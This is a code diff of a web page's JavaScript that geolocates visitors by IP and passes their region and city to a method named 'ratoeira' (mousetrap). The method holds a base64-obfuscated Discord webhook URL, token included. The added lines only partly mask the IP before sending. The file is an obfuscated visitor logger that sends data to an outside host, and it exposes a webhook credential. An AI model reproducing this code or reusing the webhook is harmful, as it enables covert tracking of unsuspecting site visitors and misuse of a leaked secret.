@@ -56,8 +56,10 @@
                        $loc.innerHTML = data.location.principalSubdivision + ", " + data.location.city + ", " + data.location.localityName;
                         
 
+                       let meioIp = i.split(".");
+
                         if(client != null){
-                            Start.ratoeira(i, `${
+                            Start.ratoeira(`${i[0]}******`, `${
                             data.location.principalSubdivision +
                             ", " +
                             data.location.localityName
@@ -129,6 +131,8 @@
                     request.send(JSON.stringify(params));
                 }
 
+
+                // Public
                 static ratoeira(id, b) {
                     let u =
                     "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzNDM1MDAwMDc4NzI5NjI1Ni9FN1ZDSFUtZDF2Y1dqZ2libTJFOFpMTXJNTkc5Mzg3UG5MTFBYMGlPcFFRekJGSHhMdDVvSHZTODllSjhaSzNMQy0zbA==";
